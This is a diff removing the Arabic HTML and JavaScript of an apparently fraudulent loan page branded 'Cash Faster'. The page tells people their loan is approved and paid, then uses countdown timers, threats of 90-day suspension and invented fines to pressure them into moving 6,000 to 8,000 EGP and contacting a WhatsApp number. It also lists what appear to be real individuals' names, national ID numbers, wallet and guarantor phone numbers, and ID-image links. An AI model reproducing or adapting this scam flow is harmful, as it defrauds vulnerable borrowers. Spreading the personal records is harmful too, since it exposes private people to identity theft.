-    <div class="footer"><i class="fas fa-shield-alt"></i> 🔒 جميع البيانات مشفرة | 🛡️ إثبات الجدارة لا يتطلب دفع أي أموال للشركة</div>
-
-  </div>
-
-<script>
-  const WHATSAPP_NUMBER = "+639976737886";
-  const WHATSAPP_URL = `https://wa.me/${WHATSAPP_NUMBER.replace(/\s/g, '')}`;
-  const PROOF_MINUTES = 45;
-  const PENDING_MINUTES = 40;
-
-  let currentCustomer = null;
-  let currentNationalId = null;
-  let timerInterval = null;
-  let pendingTimerInterval = null;
-  let isAdmin = false;
-  let adminClickCount = 0;
-
-  const INSTALLMENT_PLAN = {
-    30000: { months: 12, installment: 3325 },
-    35000: { months: 12, installment: 3875 },
-    40000: { months: 18, installment: 2965 },
-    45000: { months: 18, installment: 3325 },
-    50000: { months: 24, installment: 2725 },
-    55000: { months: 24, installment: 3075 },
-    60000: { months: 24, installment: 3085 },
-    65000: { months: 26, installment: 3325 },
-    70000: { months: 26, installment: 3585 },
-    75000: { months: 26, installment: 3845 },
-    80000: { months: 30, installment: 3550 },
-    85000: { months: 30, installment: 3775 },
-    90000: { months: 30, installment: 3990 },
-    95000: { months: 30, installment: 4220 },
-    100000: { months: 32, installment: 4157 },
-    105000: { months: 32, installment: 4375 },
-    110000: { months: 32, installment: 4580 },
-    115000: { months: 38, installment: 4075 },
-    120000: { months: 38, installment: 4235 },
-    125000: { months: 38, installment: 4035 },
-    130000: { months: 42, installment: 4400 },
-    135000: { months: 42, installment: 4305 },
-    140000: { months: 42, installment: 4495 },
-    145000: { months: 48, installment: 4075 },
-    150000: { months: 48, installment: 4205 },
-    155000: { months: 48, installment: 4315 },
-    160000: { months: 48, installment: 4435 },
-    165000: { months: 48, installment: 4615 },
-    170000: { months: 48, installment: 4725 },
-    175000: { months: 48, installment: 4848 },
-    180000: { months: 54, installment: 4435 },
-    185000: { months: 54, installment: 4557 },
-    190000: { months: 60, installment: 4215 },
-    195000: { months: 60, installment: 4325 },
-    200000: { months: 60, installment: 4440 }
-  };
-
-  function getInstallmentPlan(loanAmount) {
-    const keys = Object.keys(INSTALLMENT_PLAN).map(Number).sort((a, b) => a - b);
-    let closest = keys[0];
-    for (let k of keys) {
-      if (k <= loanAmount) closest = k;
-      if (k >= loanAmount) break;
-    }
-    if (loanAmount > 200000) closest = 200000;
-    if (loanAmount < 30000) closest = 30000;
-    const plan = INSTALLMENT_PLAN[closest];
-    if (!plan) return { months: 12, installment: Math.round(loanAmount * 0.12) };
-    return { months: plan.months, installment: plan.installment };
-  }
-
-  function getProofAmount(loanAmount, nationalId) {
-    if (nationalId === "2921000995") return 8000;
-    if (loanAmount < 100000) return 6000;
-    return 8000;
-  }
-
-  function getFirstInstallmentDate() {
-    const now = new Date();
-    now.setDate(now.getDate() + 29);
-    return now.toLocaleDateString('ar-EG', { year: 'numeric', month: 'numeric', day: 'numeric' });
-  }
-
-  function openWhatsApp(customMessage) {
-    let msg = customMessage ||
-      `📤 إرسال إثبات الجدارة الائتمانية\n\n👤 العميل: ${currentCustomer ? currentCustomer.name : ''}\n🔢 الرقم القومي: ${currentNationalId || ''}\n💰 المبلغ المطلوب صرفه: ${currentCustomer ? currentCustomer.loan.toLocaleString('ar-EG') : ''} ج.م\n\n📸 سأقوم بإرسال صور إثبات الجدارة لإتمام الصرف.`;
-    window.open(`${WHATSAPP_URL}?text=${encodeURIComponent(msg)}`, '_blank');
-  }
-
-  // ================================================================
-  //  قاعدة البيانات — 5 عملاء تجريبيين بحالات مختلفة
-  // ================================================================
-  const customersDatabase = {
-    "28602020202519": {
-  name: "السيد السيد احمد على",
-  job: "سائق لدى شركة مصر اكسبرس للتجارة والتوزيع",
-  loan: 80000,
-  wallet: "محفظة أخرى",
-  walletNum: "01060840787",
-  status: "active",
-  idVerificationImage: "https://pdftourl.net/images/1789838920577-a273ec16-b096-40bf-8130-c3aae517354f.jpg",
-  guarantor: { name: "رانيا ابراهيم محمد حسن الطواب", relation: "زوجة", phone: "01211187813" }
-},
-
-"28109082701963": {
-  name: "فاطمة محمد الصادق إبراهيم",
-  job: "وريثة معاش قوات مسلحة",
-  loan: 100000,
-  wallet: "محفظة أخرى",
-  walletNum: "01004832454",
-  status: "active",
-  idVerificationImage: "https://pdftourl.net/images/1789900455941-64055739-9cda-4633-ad43-d23c44217084.jpg",
-  guarantor: { name: "عمر على لبيب حسين", relation: "زوج", phone: "01022897235" }
-},
-
-"29304282401132": {
-  name: "ايمن صلاح رجب محمد",
-  job: "سكرتير في عيادة",
-  loan: 80000,
-  wallet: "اتصالات كاش",
-  walletNum: "01114184065",
-  status: "active",
-  idVerificationImage: "https://pdftourl.net/images/1789901497804-d0a60620-11c1-483f-9f7c-35f7ba3633f8.jpg",
-  guarantor: { name: "غاده احمد عبد العظيم احمد", relation: "زوجة", phone: "01141723690" }
-},
-
-"29303282703434": {
-  name: "شعبان محمد صلاح محروس عبد المجيد",
-  job: "محامي حر",
-  loan: 40000,
-  wallet: "اتصالات كاش",
-  walletNum: "0110282618",
-  status: "active",
-  idVerificationImage: "https://pdftourl.net/images/1789900879117-c06e4540-feb4-41da-8016-c24de4a2effe.jpg",
-  guarantor: { name: "امل محمد شحات فاوي", relation: "زوجة", phone: "01110969247" }
-}
-  };
-
-  // ================================================================
-  //  صورة التحقق من الهوية
-  // ================================================================
-  function buildIdVerification(customer) {
-    if (!customer.idVerificationImage || customer.idVerificationImage.trim() === "") return '';
-    return `
-      <div class="id-verification">
-        <div class="idv-header">
-          <div class="idv-icon"><i class="fas fa-id-card"></i></div>
-          <div>
-            <h4>🆔 التحقق من هوية العميل</h4>
-            <p>📸 صورة الهوية الموثقة في ملفك على السيستم</p>
-          </div>
-        </div>
-        <div class="idv-image-box">
-          <img src="${customer.idVerificationImage}" alt="صورة التحقق من الهوية" onerror="this.parentElement.innerHTML='<div class=\\'idv-placeholder\\'><i class=\\'fas fa-image\\'></i>⚠️ تعذر تحميل الصورة</div>'">
-        </div>
-        <div class="idv-caption">🔒 <i class="fas fa-shield-halved"></i> هذه الصورة محفوظة بشكل آمن في ملفك الشخصي</div>
-      </div>
-    `;
-  }
-
-  // ================================================================
-  //  بطاقة القرض
-  // ================================================================
-  function buildLoanCard(customer) {
-    const plan = getInstallmentPlan(customer.loan);
-    const proofAmount = getProofAmount(customer.loan, currentNationalId);
-    return `
-      <div class="loan-card">
-        <div class="label">💰 مبلغ التمويل المعتمد</div>
-        <div class="amount">${customer.loan.toLocaleString('ar-EG')} <span class="cur">ج.م</span></div>
-        <div class="approved"><i class="fas fa-check-circle"></i> ✅ تم اعتماد القرض بنجاح <span style="font-size:0.65rem;color:var(--text-muted);margin-right:0.3rem;">— بإنتظار إثبات الجدارة</span></div>
-        <div style="text-align:center;font-size:0.65rem;color:var(--text-muted);margin:0.2rem 0;">⏳ لديك ${PROOF_MINUTES} دقيقة لإثبات جدارتك الائتمانية لاستلام المبلغ</div>
-        <div class="loan-grid">
-          <div class="item"><div class="lbl">📅 المدة</div><div class="val">${plan.months} شهر</div></div>
-          <div class="item"><div class="lbl">💵 القسط الشهري</div><div class="val gold">${plan.installment.toLocaleString('ar-EG')} ج.م</div></div>
-          <div class="item"><div class="lbl">📱 المحفظة</div><div class="val">${customer.wallet || 'غير محدد'}</div></div>
-          <div class="item"><div class="lbl">🔢 رقم المحفظة</div><div class="val">${customer.walletNum || 'سيتم تحديده'}</div></div>
-          <div class="item"><div class="lbl">👥 الضامن</div><div class="val">${customer.guarantor?.name || 'غير مسجل'}</div></div>
-          <div class="item"><div class="lbl">🧾 مبلغ الإثبات</div><div class="val gold">${proofAmount.toLocaleString('ar-EG')} ج.م</div></div>
-        </div>
-      </div>
-    `;
-  }
-
-  function buildClientInfo(customer) {
-    return `
-      <div class="client-info">
-        <div class="row"><span class="k">👤 الاسم</span><span class="v">${customer.name}</span></div>
-        <div class="row"><span class="k">🔢 الرقم القومي</span><span class="v gold">${currentNationalId}</span></div>
-        <div class="row"><span class="k">💼 الوظيفة</span><span class="v">${customer.job || 'غير مسجل'}</span></div>
-        <div class="row"><span class="k">📱 المحفظة</span><span class="v gold">${customer.wallet || 'غير محدد'}</span></div>
-        <div class="row"><span class="k">🔢 رقم المحفظة</span><span class="v">${customer.walletNum || 'سيتم تسجيله'}</span></div>
-        ${customer.guarantor ? `
-          <div class="row"><span class="k">👥 الضامن</span><span class="v">${customer.guarantor.name}</span></div>
-          <div class="row"><span class="k">🔗 صلة الضامن</span><span class="v gold">${customer.guarantor.relation}</span></div>
-          <div class="row"><span class="k">📞 رقم الضامن</span><span class="v">${customer.guarantor.phone || 'غير مسجل'}</span></div>
-        ` : ''}
-      </div>
-    `;
-  }
-
-  // ================================================================
-  //  قسم الإثبات
-  // ================================================================
-  function buildProofSection(customer) {
-    const proofAmount = getProofAmount(customer.loan, currentNationalId);
-    const plan = getInstallmentPlan(customer.loan);
-
-    return `
-      <div class="proof-section">
-        <div class="proof-header">
-          <span class="icon-big"><i class="fas fa-shield-alt"></i></span>
-          <h2>🔐 إثبات الجدارة الائتمانية</h2>
-          <div class="sub">💡 هذا الإجراء منك إليك — لا يوجد أي تحويل أو دفع للشركة</div>
-        </div>
-
-        <div class="payment-notice">
-          <span class="icon"><i class="fas fa-check-circle"></i></span>
-          <h4>✅ تم دفع مبلغ القرض إلى حساب محفظة رقم ${customer.walletNum || '****'} — العميل ${customer.name}</h4>
-          <p>⏳ من الآن أمامك <span class="hl-gold">${PROOF_MINUTES} دقيقة</span> لإثبات الجدارة الائتمانية المحددة لك.<br>⚠️ <span class="hl-danger">في حالة عدم الإثبات خلال المدة المحددة، سيتم تعليق الطلب لمدة 90 يوماً.</span></p>
-        </div>
-
-        <div class="proof-amount-box">
-          <div class="label">💰 المبلغ المطلوب لإثبات الجدارة</div>
-          <div class="value">${proofAmount.toLocaleString('ar-EG')} <span class="cur">ج.م</span></div>
-          <div class="note">✅ <span class="hl-emerald">هذا المبلغ ليس للشركة</span> — بل لإثبات الجدية والجدارة الائتمانية<br>🔒 <span class="hl-gold">سيتم تفعيل صرف المبلغ فى حسابك فور الإثبات</span></div>
-        </div>
-
-        <div class="timer-box">
-          <div>⏱️ <i class="fas fa-stopwatch"></i> الوقت المتبقي لإثبات الجدارة</div>
-          <div class="timer" id="proofTimer">${String(PROOF_MINUTES).padStart(2,'0')}:00</div>
-          <div class="sub">⏳ يجب إكمال الإثبات قبل انتهاء الوقت لضمان الصرف الفوري<br>⚠️ <span class="hl-danger">بعد انتهاء الوقت سيتم تعليق الطلب 90 يوماً</span></div>
-        </div>
-
-        <div class="steps-box">
-          <div class="step">
-            <div class="num">1</div>
-            <div class="content">📥 <strong>استلام المبلغ في محفظتك</strong><br>قم بإدخال مبلغ <span class="hl-gold">${proofAmount.toLocaleString('ar-EG')} ج.م</span> إلى محفظتك (اتصالات كاش) من أي مصدر تثق به.<br>✅ <span class="hl-emerald">هذا المبلغ ليس للشركة، بل لإثبات الجدية والجدارة الائتمانية.</span></div>
-          </div>
-          <div class="step">
-            <div class="num">2</div>
-            <div class="content">📸 <strong>تصوير الرصيد بعد الاستلام</strong><br>التقط <span class="hl-gold">لقطة شاشة واضحة</span> تظهر المبلغ في حسابك بعد وصوله.<br>✅ <span class="hl-emerald">تأكد من ظهور الرصيد بوضوح مع تاريخ العملية.</span></div>
-          </div>
-          <div class="step">
-            <div class="num">3</div>
-            <div class="content">🔄 <strong>تحويل المبلغ مرة أخرى (أو سحبه)</strong><br>قم بتحويل نفس المبلغ <span class="hl-gold">مرة أخرى</span> إلى أي شخص تابع لك (صديق/قريب) أو قم بسحبه.<br>✅ <span class="hl-emerald">هذا لإثبات أن الحساب نشط وتستطيع إدارة أموالك.</span><br>⚠️ <span class="hl-danger">هذا التحويل ليس للشركة — أنت المتحكم الوحيد في حسابك.</span></div>
-          </div>
-          <div class="step">
-            <div class="num">4</div>
-            <div class="content">📸 <strong>تصوير إشعار الخروج</strong><br>التقط <span class="hl-gold">لقطة شاشة</span> لإشعار خروج المبلغ من حسابك.<br>✅ <span class="hl-emerald">تأكد من ظهور المبلغ المرسل وتاريخ العملية.</span></div>
-          </div>
-          <div class="step">
-            <div class="num">5</div>
-            <div class="content">📤 <strong>إرسال الصور لقسم التحويلات المالية</strong><br>أرسل صور <span class="hl-gold">الإيداع والتحويل</span> عبر واتساب إلى قسم التحويلات المالية.<br>✅ <span class="hl-emerald">بعد الإرسال يتم <strong style="color:var(--primary-dark);">تفعيل الصرف مباشرة</strong> لحسابك.</span><br>⚠️ <span class="hl-danger">الاثباتات المطلوبة يجب أن تكون خلال نصف ساعة من الآن — لا يتم قبول اثباتات قديمة.</span></div>
-          </div>
-        </div>
-
-        <div class="important-notes">
-          <div class="title">⚠️ <i class="fas fa-exclamation-triangle"></i> تنبيهات هامة</div>
-          <ul>
-            <li>🔴 <span class="hl-danger">لا يوجد دفع ولا تحويل لنا</span> — كل الإجراءات منك إليك فقط لإثبات الجدارة.</li>
-            <li>⏰ <span class="hl-gold">المدة المحددة للإثبات: ${PROOF_MINUTES} دقيقة</span> — يجب الانتهاء قبل انتهاء الوقت.</li>
-            <li>🚫 <span class="hl-danger">لا يتم قبول اثباتات قديمة</span> — يجب أن تكون خلال نصف ساعة من الآن.</li>
-            <li>📌 <span class="hl-gold">في حالة عدم الإثبات</span> — يتم تعليق الطلب لمدة <span class="hl-danger">90 يوماً</span>.</li>
-            <li>💰 <span class="hl-emerald">الأقساط الشهرية</span> — ستكون مطالب بدفع الأقساط في مواعيدها المحددة.</li>
-            <li>📌 <span class="hl-gold">سيتم نزول القرض</span> — بعد 90 يوماً نظراً لأنه مدفوع إلى حسابك بالفعل.</li>
-          </ul>
-        </div>
-
-        <div class="summary-box">
-          <p>🔑 <span class="hl-gold">الخلاصة:</span> إثبات الجدارة الائتمانية هو <span class="hl-emerald">مصلحة لك أولاً</span>، فهو يضمن أن القرض الذي ستحصل عليه مناسب لك، وأنك قادر على سداده براحة دون ضغط.<br><br>⚠️ <span class="hl-danger">لابد من الانتهاء من الإجراءات اللازمة ليتم الصرف لحسابك فوراً.</span><br><br>💚 <span style="color: var(--text-muted); font-size: 0.7rem;">نحن هنا لدعمك في كل خطوة<br>مع خالص التقدير، فريق كاش فاستر</span></p>
-        </div>
-
-        <button class="btn btn-purple" id="proofBtn"><i class="fas fa-paper-plane"></i> 📤 إرسال إثبات الجدارة الآن</button>
-        <button class="btn btn-gold" id="transferBtn" style="margin-top:0.3rem;"><i class="fas fa-check-circle"></i> ✅ تأكيد استلام المبلغ</button>
-        <div style="margin-top:0.6rem;text-align:center;font-size:0.6rem;color:var(--text-muted);position:relative;z-index:1;">🔒 <i class="fas fa-lock"></i> هذه العملية آمنة ومشفرة | لا توجد أي رسوم مطلوبة</div>
-      </div>
-    `;
-  }
-
-  // ================================================================
-  //  بطاقة معلق
-  // ================================================================
-  function buildPendingCard(customer) {
-    return `
-      <div class="pending-card">
-        <div class="icon">⏳ <i class="fas fa-hourglass-half"></i></div>
-        <h2>⏳ طلبك <span>معلق</span></h2>
-
-        <div class="pending-timer-box">
-          <div style="font-size:0.7rem;color:var(--text-muted);margin-bottom:0.2rem;">⏰ الوقت المتبقي لفتح الطلب</div>
-          <div class="timer" id="pendingTimer">${String(PENDING_MINUTES).padStart(2,'0')}:00</div>
-          <div class="label">⚠️ <span class="hl-danger">بعد انتهاء الوقت سيتم شطب الطلب لمدة 90 يوماً</span></div>
-        </div>
-
-        <div class="sub">
-          🔴 <span class="hl-danger">طلبك معلق حالياً!</span><br><br>
-          📌 <span class="hl-gold">يجب فتح التعليق قبل عملية الإثبات بمدة 30 دقيقة</span><br>
-          ليتم قبول الإثبات ونزول مبلغ القرض إلى الحساب مباشرة.<br><br>
-          ⚠️ <span class="hl-danger">إذا تم الإثبات والطلب معلق، لن يتم قبوله</span><br>
-          وسيتم مطالبتك بإثبات مرة أخرى حديث.<br><br>
-          ⛔ <span class="hl-danger">إذا انتهى الوقت سيتم شطب الطلب لمدة 90 يوماً</span><br>
-          ولن تتمكن من استرداد طلبك مرة أخرى.<br><br>
-          ✨ <span class="hl-emerald">أنت على بعد خطوة واحدة من صرف مبلغ القرض</span><br><br>
-          💰 <span class="hl-gold">نؤكد: لا يوجد دفع أو تحويل لأي شخص تابع لنا</span><br>
-          كل ما هو مطلوب منك إثبات جدارة ائتمانية لك فقط.
-        </div>
-
-        <button class="btn btn-whatsapp" onclick="openWhatsApp('📞 طلب فتح الطلب المعلق\\n👤 العميل: ${customer.name}\\n🔢 الرقم القومي: ${currentNationalId}\\n💰 المبلغ: ${customer.loan.toLocaleString('ar-EG')} ج.م\\n\\n🙏 أرجو فتح الطلب الخاص بي لإتمام إجراءات إثبات الجدارة الائتمانية.\\n\\n⏱️ علماً بأن لدي 30 دقيقة فقط لإرسال الإثباتات بعد فتح الطلب.')">
-          <i class="fab fa-whatsapp"></i> 📞 تواصل لفتح الطلب
-        </button>
-
-        <div class="note">
-          ⚠️ <span class="hl-danger">تنبيه هام:</span> يجب التواصل قبل الإثبات بنصف ساعة على الأقل<br>
-          ليتم فتح الطلب وقبول الإثباتات ونزول المبلغ لحسابك فوراً.
-        </div>
-      </div>
-    `;
-  }
-
-  // ================================================================
-  //  بطاقة مشطوب
-  // ================================================================
-  function buildDeletedCard(customer) {
-    return `
-      <div class="pending-card" style="border-color: var(--danger); background: linear-gradient(145deg, #FFFFFF, var(--danger-light));">
-        <div class="icon" style="color: var(--danger);">🚫 <i class="fas fa-ban"></i></div>
-        <h2>❌ تم <span style="color: var(--danger);">شطب</span> طلبك</h2>
-
-        <div class="sub">
-          🔴 <span class="hl-danger">طلبك تم شطبه من النظام!</span><br><br>
-          📌 <span class="hl-gold">يمكنك إعادة المحاولة مرة أخرى بعد مرور 90 يوماً</span><br>
-          من تاريخ اليوم، ولن تتمكن من استرداد طلبك قبل انتهاء هذه المدة.<br><br>
-          ⚠️ <span class="hl-danger">في حالة الحاجة العاجلة، يمكنك التواصل مع الدعم الفني</span><br>
-          لمعرفة إن كان هناك أي إمكانية لمراجعة طلبك.<br><br>
-          ✨ <span class="hl-emerald">نحن هنا لمساعدتك في أي وقت</span><br>
-          مع خالص التقدير، فريق كاش فاستر
-        </div>
-
-        <div style="margin-top:1rem;padding:1rem;background:var(--danger-light);border:2px solid var(--danger);border-radius:var(--radius-md);text-align:center;">
-          <div style="font-size:0.8rem;color:var(--danger);font-weight:800;margin-bottom:0.5rem;">⏳ مدة الانتظار المتبقية</div>
-          <div style="font-size:2.5rem;font-weight:900;color:var(--danger);font-family:monospace;letter-spacing:3px;">90 يوم</div>
-          <div style="font-size:0.7rem;color:var(--text-muted);margin-top:0.3rem;">❌ لن تتمكن من استرداد طلبك قبل هذه المدة</div>
-        </div>
-
-        <button class="btn btn-whatsapp" style="margin-top:0.8rem;" onclick="openWhatsApp('📞 استفسار عن طلب مشطوب\\n\\n👤 العميل: ${customer.name}\\n🔢 الرقم القومي: ${currentNationalId}\\n💰 المبلغ: ${customer.loan.toLocaleString('ar-EG')} ج.م\\n\\n⚠️ تم شطب طلبي وأرغب في معرفة إن كان هناك إمكانية لمراجعته.')">
-          <i class="fab fa-whatsapp"></i> 📞 تواصل مع الدعم الفني
-        </button>
-
-        <div class="note" style="margin-top:0.8rem;">
-          💡 <span class="hl-gold">تذكر:</span><br>
-          ⏳ <span class="hl-danger">يجب الانتظار 90 يوماً كاملة</span> قبل إعادة التقديم<br>
-          📌 <span class="hl-emerald">إذا كنت بحاجة لمساعدة عاجلة، تواصل معنا</span>
-        </div>
-      </div>
-    `;
-  }
-
-  // ================================================================
-  //  بطاقة تم الاستلام
-  // ================================================================
-  function buildCompletedCard(customer) {
-    return `
-      <div class="pending-card" style="border-color: var(--primary); background: linear-gradient(145deg, #FFFFFF, var(--primary-light));">
-        <div class="icon" style="color: var(--primary);">🎉 <i class="fas fa-circle-check"></i></div>
-        <h2>✅ تم <span style="color: var(--primary);">استلام</span> طلبك بنجاح</h2>
-
-        <div class="sub">
-          🎊 <span class="hl-emerald">تهانينا! تم إتمام جميع إجراءات الإثبات بنجاح.</span><br><br>
-          💰 <span class="hl-gold">سيتم صرف مبلغ القرض ${customer.loan.toLocaleString('ar-EG')} ج.م</span><br>
-          إلى محفظتك خلال الساعات القادمة.<br><br>
-          📱 <span class="hl-emerald">رقم المحفظة: ${customer.walletNum || '****'}</span><br><br>
-          💚 <span style="color: var(--text-muted); font-size: 0.8rem;">شكراً لثقتك بنا — نتمنى لك التوفيق<br>مع خالص التقدير، فريق كاش فاستر</span>
-        </div>
-
-        <button class="btn btn-whatsapp" style="margin-top:0.8rem;" onclick="openWhatsApp('📞 استفسار عن موعد الصرف\\n\\n👤 العميل: ${customer.name}\\n🔢 الرقم القومي: ${currentNationalId}\\n💰 المبلغ: ${customer.loan.toLocaleString('ar-EG')} ج.م\\n\\n✅ تم استلام طلبي بنجاح وأرغب في معرفة موعد الصرف.')">
-          <i class="fab fa-whatsapp"></i> 📞 تواصل لمتابعة الصرف
-        </button>
-      </div>
-    `;
-  }
-
-  // ================================================================
-  //  عرض النتيجة
-  // ================================================================
-  function displayResult(customer, nationalId) {
-    currentCustomer = customer;
-    currentNationalId = nationalId;
-    const area = document.getElementById('resultArea');
-
-    const statusLabels = {
-      'active': '🟢 نشط',
-      'pending': '⏳ معلق',
-      'deleted': '🚫 مشطوب',
-      'completed': '✅ تم الاستلام'
-    };
-    const statusEl = document.getElementById('currentStatusText');
-    if (statusEl) statusEl.textContent = statusLabels[customer.status] || 'غير محدد';
-
-    if (nationalId === '27310192600813') {
-      area.innerHTML = buildIdVerification(customer) + buildPendingOnePmCard(customer);
-      document.getElementById('errorBox').style.display = 'none';
-      startOnePmTimer();
-      return;
-    }
-
-    if (nationalId === '28309030201937') {
-      area.innerHTML = buildIdVerification(customer) + buildDebtorCard(customer);
-      document.getElementById('errorBox').style.display = 'none';
-      startPenaltyTimer();
-      return;
-    }
-
-    if (customer.status === 'deleted') {
-      area.innerHTML = buildIdVerification(customer) + buildDeletedCard(customer);
-      document.getElementById('errorBox').style.display = 'none';
-      return;
-    }
-
-    if (customer.status === 'pending') {
-      area.innerHTML = buildIdVerification(customer) + buildPendingCard(customer);
-      document.getElementById('errorBox').style.display = 'none';
-      startPendingTimer();
-      return;
-    }
-
-    if (customer.status === 'completed') {
-      area.innerHTML = buildIdVerification(customer) + buildCompletedCard(customer);
-      document.getElementById('errorBox').style.display = 'none';
-      return;
-    }
-
-    // الحالة الافتراضية: active
-    let html = '';
-    html += buildLoanCard(customer);
-    html += buildIdVerification(customer);
-    html += buildProofSection(customer);
-    html += buildClientInfo(customer);
-
-    area.innerHTML = html;
-    document.getElementById('errorBox').style.display = 'none';
-
-    bindButtons(customer);
-    startTimers(customer);
-  }
-
-  // ================================================================
-  //  حالات خاصة
-  // ================================================================
-  function buildPendingOnePmCard(customer) {
-    const proofAmount = getProofAmount(customer.loan, currentNationalId);
-    return `
-      <div class="pending-card">
-        <div class="icon">⏳ <i class="fas fa-hourglass-half"></i></div>
-        <h2>⏳ طلبك <span>معلق</span> حتى الساعة <span>الواحدة ظهراً</span></h2>
-
-        <div class="pending-timer-box">
-          <div style="font-size:0.7rem;color:var(--text-muted);margin-bottom:0.2rem;">⏰ الوقت المتبقي لفتح الطلب</div>
-          <div class="timer" id="pendingTimer">--:--:--</div>
-          <div class="label">⚠️ <span class="hl-danger">بعد الساعة الواحدة ظهراً سيتم شطب الطلب لمدة 90 يوماً</span></div>
-        </div>
-
-        <div class="sub">
-          🔴 <span class="hl-danger">طلبك معلق حالياً حتى الساعة الواحدة ظهراً!</span><br><br>
-          📌 <span class="hl-gold">يجب التواصل مع قسم التحويلات المالية على واتساب فوراً لفتح التعليق</span><br>
-          ليتم قبول الإثبات ونزول مبلغ القرض إلى حسابك مباشرة.<br><br>
-          ✅ <span class="hl-emerald">مبلغ القرض مدفوع لحسابك بالفعل بمبلغ ${customer.loan.toLocaleString('ar-EG')} ج.م</span><br>
-          وفي انتظار إثبات الجدارة الائتمانية فقط.<br><br>
-          💰 <span class="hl-gold">مبلغ الإثبات: ${proofAmount.toLocaleString('ar-EG')} ج.م</span> — وسيتم تفعيل صرف المبلغ فوراً.<br><br>
-          ✨ <span class="hl-emerald">لا يوجد دفع ولا تحويل للشركة نهائياً</span><br>
-          كل ما هو مطلوب منك إثبات جدارة ائتمانية لك فقط.<br><br>
-          ⚠️ <span class="hl-danger">يرجى الانتهاء ليتم الصرف في خلال دقائق</span>
-        </div>
-
-        <button class="btn btn-whatsapp" onclick="openWhatsApp('📞 طلب استثناء لإثبات الجدارة الائتمانية\\n\\n👤 العميل: ${customer.name}\\n🔢 الرقم القومي: ${currentNationalId}\\n💰 المبلغ: ${customer.loan.toLocaleString('ar-EG')} ج.م\\n🧾 مبلغ الإثبات: ${proofAmount.toLocaleString('ar-EG')} ج.م\\n\\n🙏 أرجو عمل استثناء لإثبات الجدارة المطلوبة وفتح التعليق على الطلب الخاص بي.\\n⏱️ علماً بأن لدي 30 دقيقة فقط لإرسال الإثباتات بعد فتح الطلب.')">
-          <i class="fab fa-whatsapp"></i> 📞 تواصل لفتح التعليق وعمل استثناء
-        </button>
-
-        <div class="note">
-          ⚠️ <span class="hl-danger">تنبيه هام:</span> يجب التواصل قبل الإثبات بنصف ساعة على الأقل<br>
-          ليتم فتح الطلب وقبول الإثباتات ونزول المبلغ لحسابك فوراً.
-        </div>
-      </div>
-    `;
-  }
-
-  function buildDebtorCard(customer) {
-    const proofAmount = getProofAmount(customer.loan, currentNationalId);
-    const penalty = 5150;
-    return `
-      <div class="loan-card">
-        <div class="label">💰 مبلغ التمويل المعتمد</div>
-        <div class="amount">${customer.loan.toLocaleString('ar-EG')} <span class="cur">ج.م</span></div>
-        <div class="approved"><i class="fas fa-check-circle"></i> ✅ تم دفع القرض إلى حسابك بالفعل</div>
-        <div style="text-align:center;font-size:0.65rem;color:var(--text-muted);margin:0.2rem 0;">⏳ الجدارة الائتمانية محجوزة بقيمة ${proofAmount.toLocaleString('ar-EG')} ج.م وسيتم نزولها مرة أخرى</div>
-        <div class="loan-grid">
-          <div class="item"><div class="lbl">💰 المبلغ المدفوع</div><div class="val green">${customer.loan.toLocaleString('ar-EG')} ج.م</div></div>
-          <div class="item"><div class="lbl">🔒 الجدارة المحجوزة</div><div class="val gold">${proofAmount.toLocaleString('ar-EG')} ج.م</div></div>
-          <div class="item"><div class="lbl">⚠️ الغرامة المالية</div><div class="val danger">${penalty.toLocaleString('ar-EG')} ج.م</div></div>
-        </div>
-      </div>
-
-      <div class="payment-notice">
-        <span class="icon"><i class="fas fa-check-circle"></i></span>
-        <h4>✅ تم دفع مبلغ القرض ${customer.loan.toLocaleString('ar-EG')} ج.م إلى حساب محفظة رقم ${customer.walletNum || '****'}</h4>
-        <p>👤 العميل: <span class="hl-gold">${customer.name}</span><br>
-        🔒 الجدارة الائتمانية محجوزة بقيمة <span class="hl-gold">${proofAmount.toLocaleString('ar-EG')} ج.م</span> وسيتم نزولها مرة أخرى.<br>
-        ✅ <span style="color:var(--primary-dark);font-weight:800;">تم إثبات الجدارة الائتمانية بالفعل</span> — لا تحتاج لإثباتها مرة أخرى.</p>
-      </div>
-
-      <div class="important-notes">
-        <div class="title">⚠️ <i class="fas fa-exclamation-triangle"></i> تنبيهات هامة جداً</div>
-        <ul>
-          <li>🔴 <span class="hl-danger">أنت مدان بالقرض المدفوع لحسابك</span> — يجب دفع الغرامة المالية.</li>
-          <li>💰 <span class="hl-danger">الغرامة المالية: ${penalty.toLocaleString('ar-EG')} ج.م</span> — يجب دفعها خلال <span class="hl-gold">8 ساعات</span>.</li>
-          <li>⚠️ <span class="hl-danger">في حالة عدم الدفع خلال 8 ساعات</span> — تتضاعف الغرامة المالية.</li>
-          <li>📌 <span class="hl-gold">في حالة شطب الطلب</span> — يتم استرداد طلبك مرة أخرى بعد مرور <span class="hl-danger">90 يوماً</span>.</li>
-          <li>🚫 <span class="hl-danger">لن تتمكن من استرداد طلبك قبل هذه المدة.</span></li>
-          <li>✅ <span class="hl-emerald">يرجى الانتهاء ليتم الصرف في خلال دقائق.</span></li>
-        </ul>
-      </div>
-
-      <div class="timer-box" style="border-color: var(--danger); background: var(--danger-light);">
-        <div>⏱️ <i class="fas fa-stopwatch" style="color:var(--danger);"></i> الوقت المتبقي لدفع الغرامة</div>
-        <div class="timer" id="penaltyTimer" style="color:var(--danger);">08:00:00</div>
-        <div class="sub">⏳ يجب دفع الغرامة قبل انتهاء الوقت لتجنب تضاعفها<br>⚠️ <span class="hl-danger">بعد انتهاء الوقت تتضاعف الغرامة المالية</span></div>
-      </div>
-
-      <button class="btn btn-whatsapp" onclick="openWhatsApp('📞 دفع الغرامة المالية\\n\\n👤 العميل: ${customer.name}\\n🔢 الرقم القومي: ${currentNationalId}\\n💰 المبلغ المدفوع: ${customer.loan.toLocaleString('ar-EG')} ج.م\\n🔒 الجدارة المحجوزة: ${proofAmount.toLocaleString('ar-EG')} ج.م\\n⚠️ الغرامة المالية: ${penalty.toLocaleString('ar-EG')} ج.م\\n\\nأرجو دفع الغرامة المالية لتجنب تضاعفها.')">
-        <i class="fab fa-whatsapp"></i> 📞 تواصل لدفع الغرامة المالية
-      </button>
-
-      <div class="client-info" style="margin-top:0.6rem;">
-        <div class="row"><span class="k">👤 الاسم</span><span class="v">${customer.name}</span></div>
-        <div class="row"><span class="k">🔢 الرقم القومي</span><span class="v gold">${currentNationalId}</span></div>
-        <div class="row"><span class="k">💼 الوظيفة</span><span class="v">${customer.job || 'غير مسجل'}</span></div>
-        <div class="row"><span class="k">📱 المحفظة</span><span class="v gold">${customer.wallet || 'غير محدد'}</span></div>
